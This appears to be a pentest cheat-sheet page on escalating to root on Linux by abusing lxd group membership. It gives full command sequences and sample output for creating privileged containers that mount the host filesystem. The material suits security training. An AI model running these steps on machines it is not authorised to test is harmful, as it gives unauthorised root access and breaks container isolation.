---
id: Containers
aliases: ""
tags:
  - Linux/Privesc/Containers
links: "[[Linux/Linux]]"
---

# Containers

Escalate privileges with  Linux containers
and container templates

___

<!-- Enumerate {{{-->
## Enumerate

Enumerate container [[Group#Containers|containers]] membership
(*[[Group#LXC|LXC]] & [[Group#LXD|LXD]]*)

```sh
id
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> container-user@nix02:~$ id
> ```
> ```sh
> uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
> ```
>
<!-- }}} -->

Enumerate default image template directory

```sh
ls -al /home/<user>/ContainerImages
```

___
<!-- }}} -->

<!-- Privesc {{{-->
## Privesc

<!-- Template {{{-->
### Template

Escalate privileges using unsecure templates

<!-- Example {{{-->
> [!example]-
>
> ```sh
> container-user@nix02:~$ cd ContainerImages
> ```
> ```sh
> container-user@nix02:~$ ls
> ```
> ```sh
> ubuntu-template.tar.xz
> ```
<!-- }}} -->

1. [[Containers/General#LXD|LXD]] -
   Initialize with defaults

```sh
lxd init
```

2. Import container as an image

```sh
lxc image import <template>.tar.xz --alias <alias>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> lxc image import ubuntu-template.tar.gz --alias template
> ```
> ```sh
> Image imported with fingerprint: b14f17d61b9d2997ebe1d3620fbfb2e48773678c186c2294c073e2122c41a485
> ```
>
<!-- }}} -->

3. List imported images

```sh
lxc image list
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> lxc image list
> ```
>
> ```sh
> +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
> |                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
> +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
> | ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
> +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
> ```
>
<!-- }}} -->

4. Initialize privileged container

```sh
lxc init <alias> <name> -c security.privileged=true
```

<!-- Info {{{-->
> [!info]-
>
> - `-c security.privileged=true`: Disable all isolation features
>   allowing to act on the host
>   (*Run the container without a UID mapping*)
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> lxc init template privesc -c security.privileged=true
> ```
> ```sh
> Creating privesc
> ```
<!-- }}} -->

5. Mount the host file system

```sh
lxc config device add <name> host-root disk source=/ path=/mnt/root recursive=true
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
> ```
<!-- }}} -->

6. List imported images

```sh
lxc list
```

7. Start the container

```sh
lxc start <name>
```

```sh
lxc exec <name> /bin/bash
```

```sh
lxc exec <name> /bin/sh
```

<!-- Example {{{-->
> [!example]-
>
> `/bin/bash`
>
> ```sh
> lxc start privesc
> ```
> ```sh
> lxc exec privesc /bin/bash
> ```
>
> `/bin/sh`
>
> ```sh
> lxc start privesc
> ```
> ```sh
> lxc exec privesc /bin/sh
> ```
<!-- }}} -->

8. In the container, [cd](https://man7.org/linux/man-pages/man1/cd.1p.html)
   into the mounted filesystem

```sh
ls -l /mnt/root
```

```sh
cd /mnt/root
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> root@nix02:~# ls -l /mnt/root
> ```
>
> ```sh
> total 68
> lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
> drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
> drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
> drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
> drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
> drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
> lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
> lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
> lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
> lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
> drwx------   2 root root 16384 Oct  6  2021 lost+found
> drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
> drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
> drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
> dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
> drwx------   6 root root  4096 Sep 26 21:11 root
> drwxr-xr-x  28 root root   920 Oct 24 13:32 run
> lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
> drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
> drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
> dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
> drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
> drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
> drwxr-xr-x  13 root root  4096 Apr 23  2020 var
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Alpine {{{-->
### Alpine

Escalate privileges via [Alpine image](https://images.lxd.canonical.com/)

<!-- Method 1 {{{-->
#### Method 1

Privesc with [Alpine image](https://images.lxd.canonical.com/)

1. Download the latest [Alpine image](https://images.lxd.canonical.com/)
   (*`lxd.tar.xz` and `rootfs.squashfs`*)
   to use with lxd

2. [[Containers/General#LXD|LXD]] -
   Initialize with defaults

```sh
lxd init
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> devops@NIX02:~$ lxd init
> ```
>
> ```sh
> Do you want to configure a new storage pool (yes/no) [default=yes]? yes
> Name of the storage backend to use (dir or zfs) [default=dir]: dir
> Would you like LXD to be available over the network (yes/no) [default=no]? no
> Do you want to configure the LXD bridge (yes/no) [default=yes]? yes
> ```
>
> ```sh
> /usr/sbin/dpkg-reconfigure must be run as root
> error: Failed to configure the bridge
> ```
<!-- }}} -->

3. Import the files to an image

```sh
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```

<!-- Info {{{-->
> [!info]-
>
> - `import lxd.tar.xyz rootfs.squashfs`: Import Alpine images
> - `--alias alpine`: Define image name
<!-- }}} -->

4. List imported images

```sh
lxc image list
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> lxc image list
> ```
>
> ```sh
> +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
> |                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
> +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
> | ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
> +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
> ```
>
<!-- }}} -->

5. Initialize privileged container

```sh
lxc init alpine r00t -c security.privileged=true
```

<!-- Info {{{-->
> [!info]-
>
> - `-c security.privileged=true`: Disable all isolation features
>   allowing to act on the host
>   (*Run the container without a UID mapping*)
<!-- }}} -->

6. List imported images

```sh
lxc list
```

7. Mount the host filesystem

```sh
lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
```

<!-- No Storage Pool {{{-->
> [!warning]- No Storage Pool
>
> ```sh
> Error: No storage pool found. Please create a new storage pool
> ```
> 1. Initialize lxd and set up all options on default
>
> ```sh
> lxd init
> ```
>
> 2. Repeat the previous commands
>
<!-- }}} -->

8. Start the container

```sh
lxc start r00t
```

```sh
lxc exec r00t /bin/sh
```

```sh
lxc exec r00t /bin/bash
```

9. In the container, [cd](https://man7.org/linux/man-pages/man1/cd.1p.html)
   into the mounted filesystem

```sh
ls -l /mnt/root
```

```sh
cd /mnt/root
```

<!-- }}} -->

<!-- Method 2 {{{-->
#### Method 2

Privesc with [Alpine image](https://images.lxd.canonical.com/) 2

1. Build a simple [Alpine image](https://images.lxd.canonical.com/)

```sh
git clone https://github.com/saghul/lxd-alpine-builder
```
```sh
cd lxd-alpine-builder
```
```sh
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
```
```sh
sudo ./build-alpine -a i686
```

2. Import the image

```sh
cd $HOME
```

```sh
lxc image import ./alpine*.tar.gz --alias myimage
```

3. Start and configure the lxd storage pool as default
(*Before running the image*)

```sh
lxd init
```

4. Run the image

```sh
lxc init myimage mycontainer -c security.privileged=true
```

5. Mount the `/root` into the image

```sh
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
